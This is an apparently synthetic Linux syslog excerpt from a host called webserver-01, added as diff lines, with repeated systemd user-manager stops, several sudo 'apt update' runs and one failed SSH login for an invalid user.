+Oct 25 06:19:58 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:24:47 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 06:26:54 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:28:42 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:32:18 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:34:10 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:34:46 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:37:55 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 06:42:17 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:44:12 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 06:46:24 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:50:10 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:50:26 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 06:54:08 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:58:15 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:58:57 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:03:32 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:05:44 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:07:06 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:13:20 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:17:19 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 07:17:44 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 07:18:53 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:24:28 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:29:53 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:35:55 webserver-01 sshd[7139]: Failed password for invalid user test from 203.0.113.45 port 20139 ssh2
+Oct 25 07:38:33 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:41:56 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:42:01 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 07:44:40 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:47:26 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:51:34 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:51:53 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:54:35 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 07:56:19 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 07:59:59 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
